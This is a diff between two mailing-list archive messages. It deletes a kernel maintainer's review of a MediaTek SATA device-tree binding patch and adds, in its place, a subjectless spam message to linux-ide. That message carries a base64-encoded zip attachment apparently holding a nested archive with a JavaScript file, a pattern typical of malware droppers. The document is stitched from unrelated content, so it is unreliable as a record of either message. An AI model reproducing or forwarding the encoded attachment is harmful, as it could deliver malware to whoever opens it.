@@ -1,103 +1,68 @@
-From: Rob Herring <robh@kernel.org>
-Subject: Re: [PATCH v2 2/2] dt-bindings: ata: add DT bindings for MediaTek
- SATA controller
-Date: Thu, 10 Aug 2017 15:51:49 -0500
-Message-ID: <20170810205149.lkphpv7krhdaa23y@rob-hp-laptop>
-References: <cover.1502098458.git.ryder.lee@mediatek.com>
- <a7ceb4ed8cc3542169ae8d2d995bdd4707f504e1.1502098458.git.ryder.lee@mediatek.com>
+From: <mitch_128@hotmail.com>
+Subject: (unknown)
+Date: Thu, 10 Aug 2017 21:08:15 -0000
+Message-ID: <150239929501.22642.15480528872545464451@m1net.com.sg>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="6807682246.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mail-yw0-f195.google.com ([209.85.161.195]:32769 "EHLO
-        mail-yw0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752800AbdHJUvw (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Thu, 10 Aug 2017 16:51:52 -0400
-Content-Disposition: inline
-In-Reply-To: <a7ceb4ed8cc3542169ae8d2d995bdd4707f504e1.1502098458.git.ryder.lee@mediatek.com>
+Received: from 23.149.126.129.static.m1net.com.sg ([129.126.149.23]:33336 "HELO
+        m1net.com.sg" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752942AbdHJVIW (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Thu, 10 Aug 2017 17:08:22 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: Ryder Lee <ryder.lee@mediatek.com>
-Cc: Hans de Goede <hdegoede@redhat.com>, Tejun Heo <tj@kernel.org>, devicetree@vger.kernel.org, linux-mediatek@lists.infradead.org, linux-kernel@vger.kernel.org, linux-ide@vger.kernel.org, Long Cheng <long.cheng@mediatek.com>
+To: linux-ide@vger.kernel.org
 
-On Mon, Aug 07, 2017 at 05:52:21PM +0800, Ryder Lee wrote:
-> Add DT bindings for the onboard SATA controller present on the MediaTek
-> SoCs.
-> 
-> Signed-off-by: Ryder Lee <ryder.lee@mediatek.com>
-> ---
->  Documentation/devicetree/bindings/ata/ahci-mtk.txt | 50 ++++++++++++++++++++++
->  1 file changed, 50 insertions(+)
->  create mode 100644 Documentation/devicetree/bindings/ata/ahci-mtk.txt
-> 
-> diff --git a/Documentation/devicetree/bindings/ata/ahci-mtk.txt b/Documentation/devicetree/bindings/ata/ahci-mtk.txt
-> new file mode 100644
-> index 0000000..ed04dfc
-> --- /dev/null
-> +++ b/Documentation/devicetree/bindings/ata/ahci-mtk.txt
-> @@ -0,0 +1,50 @@
-> +MediaTek Seria ATA controller
-
-s/Seria/Serial/
-
-> +
-> +Required properties:
-> + - compatible	   : Must be "mediatek,ahci".
-
-SoC specific compatible strings please.
-
-> + - reg		   : Physical base addresses and length of register sets.
-> + - interrupts	   : Interrupt associated with the SATA device.
-> + - interrupt-names : Associated name must be: "hostc".
-> + - clocks	   : A list of phandle and clock specifier pairs, one for each
-> +		     entry in clock-names.
-> + - clock-names	   : Associated names must be: "ahb", "axi", "asic", "rbc", "pm".
-> + - phys		   : A phandle and PHY specifier pair for the PHY port.
-> + - phy-names	   : Associated name must be: "sata-phy".
-> + - ports-implemented : Mask that indicates which ports that the HBA supports
-> +		       are available for software to use. Useful if PORTS_IMPL
-> +		       is not programmed by the BIOS, which is true with some
-> +		       embedded SOC's.
-
-Do you have a variable number of ports and need this in DT? Because it 
-looks like you only define having a single phy.
-
-But this is a standard prop, so you can just say "see 
-./ahci-platform.txt"
-
-> +
-> +Optional properties:
-> + - power-domains   : A phandle and power domain specifier pair to the power
-> +		     domain which is responsible for collapsing and restoring
-> +		     power to the peripheral.
-> + - resets	   : Must contain an entry for each entry in reset-names.
-> +		     See ../reset/reset.txt for details.
-> + - reset-names	   : Associated names must be: "axi", "sw", "reg".
-> + - mediatek,phy-mode : A phandle to the system controller, used to enable
-> +		       SATA function.
-> +
-> +Example:
-> +
-> +	sata: sata@1a200000 {
-> +		compatible = "mediatek,ahci";
-> +		reg = <0 0x1a200000 0 0x1100>;
-> +		interrupts = <GIC_SPI 233 IRQ_TYPE_LEVEL_HIGH>;
-> +		interrupt-names = "hostc";
-> +		clocks = <&pciesys CLK_SATA_AHB_EN>,
-> +			 <&pciesys CLK_SATA_AXI_EN>,
-> +			 <&pciesys CLK_SATA_ASIC_EN>,
-> +			 <&pciesys CLK_SATA_RBC_EN>,
-> +			 <&pciesys CLK_SATA_PM_EN>;
-> +		clock-names = "ahb", "axi", "asic", "rbc", "pm";
-> +		phys = <&u3port1 PHY_TYPE_SATA>;
-> +		phy-names = "sata-phy";
-> +		ports-implemented = <0x1>;
-> +		power-domains = <&scpsys MT7622_POWER_DOMAIN_HIF0>;
-> +		resets = <&pciesys MT7622_SATA_AXI_BUS_RST>,
-> +			 <&pciesys MT7622_SATA_PHY_SW_RST>,
-> +			 <&pciesys MT7622_SATA_PHY_REG_RST>;
-> +		reset-names = "axi", "sw", "reg";
-> +		mediatek,phy-mode = <&pciesys>;
-> +	};
-> -- 
-> 1.9.1
-> 
+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
